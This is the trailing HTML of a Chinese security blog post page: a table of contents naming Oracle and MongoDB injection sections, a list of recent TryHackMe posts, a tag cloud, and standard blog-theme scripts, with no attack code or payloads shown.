dbms_utility.sqlid_to_sqlhash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4510-ordsysord_dicomgetmappingxpath"><span class="toc-number">4.5.9.</span> <span class="toc-text">4.5.10 ordsys.ord_dicom.getmappingxpath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4511-utl_inaddrget_host_name"><span class="toc-number">4.5.10.</span> <span class="toc-text">4.5.11 UTL_INADDR.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4512-utl_inaddrget_host_address"><span class="toc-number">4.5.11.</span> <span class="toc-text">4.5.12 UTL_INADDR.get_host_address</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-mongodb"><span class="toc-number">5.</span> <span class="toc-text">0x05 MongoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#51-nosql%E4%B8%8Emongodb%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 NoSQL与MongoDB基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-php%E6%93%8D%E4%BD%9Cmongodb"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 PHP操作MongoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#521-%E4%BD%BF%E7%94%A8mongodb%E7%B1%BB%E4%B8%AD%E7%9B%B8%E5%BA%94%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">5.2.1.</span> <span class="toc-text">5.2.1 使用MongoDB类中相应的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E9%9B%86%E5%90%88"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">1. 创建集合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%8F%92%E5%85%A5%E6%96%87%E6%A1%A3"><span class="toc-number">5.2.1.2.</span> <span class="toc-text">2. 插入文档</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9F%A5%E6%89%BE%E6%96%87%E6%A1%A3"><span class="toc-number">5.2.1.3.</span> <span class="toc-text">3. 查找文档</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3"><span class="toc-number">5.2.1.4.</span> <span class="toc-text">4. 更新文档</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%88%A0%E9%99%A4%E6%96%87%E6%A1%A3"><span class="toc-number">5.2.1.5.</span> <span class="toc-text">5. 删除文档</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#522-%E4%BD%BF%E7%94%A8execute%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">5.2.2.</span> <span class="toc-text">5.2.2 使用execute()函数执行字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-php-mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 PHP MongoDB注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#531-php%E6%95%B0%E7%BB%84%E6%B3%A8%E5%85%A5%E9%87%8D%E8%A8%80%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.1.</span> <span class="toc-text">5.3.1 PHP数组注入&#x2F;重言式注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#532-execute%E6%89%A7%E8%A1%8C%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AF%BC%E8%87%B4%E7%9A%84%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.2.</span> <span class="toc-text">5.3.2 execute()执行拼接字符串导致的注入&#x2F;联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B3%A8%E9%87%8A"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">利用注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%97%AD%E5%90%88"><span class="toc-number">5.3.2.2.</span> <span class="toc-text">利用闭合</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">0x06 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">7.</span> <span class="toc-text">0x07 参考文章</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql%E5%8F%82%E8%80%83"><span class="toc-number">7.1.</span> <span class="toc-text">mssql参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#postgresql%E5%8F%82%E8%80%83"><span class="toc-number">7.2.</span> <span class="toc-text">postgresql参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle%E5%8F%82%E8%80%83"><span class="toc-number">7.3.</span> <span class="toc-text">Oracle参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mongodb%E5%8F%82%E8%80%83"><span class="toc-number">7.4.</span> <span class="toc-text">MongoDB参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>